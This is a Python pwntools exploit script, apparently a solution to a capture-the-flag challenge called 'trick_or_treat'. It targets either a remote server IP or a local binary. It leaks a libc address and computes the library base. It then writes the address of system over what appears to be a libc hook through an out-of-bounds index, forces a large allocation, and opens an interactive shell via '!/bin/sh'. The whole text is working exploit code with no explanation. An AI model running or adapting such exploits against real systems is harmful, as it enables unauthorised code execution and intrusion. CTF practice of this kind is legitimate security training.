from pwn import *
import sys

if sys.argv[1] == "1" : 
	p = remote("3.112.41.140",56746)
	offset = 0x5ee010
else :
	p = process("./trick_or_treat")
	offset = 0x5e4010

p.sendlineafter(":",str(134544))
p.recvuntil(":")
leak = int(p.recvline(),16) 
libcbase = leak - offset

print hex(leak)
print hex(libcbase)

p.sendlineafter(":","-"+hex((leak-(libcbase+0x3ed8e8))/8)[2:]+" "+hex((libcbase+0x4f440))[2:])

p.sendafter(":","cc"*0x400)

p.sendline("aa")
p.sendline("ed")
p.sendline("!/bin/sh")

p.interactive()
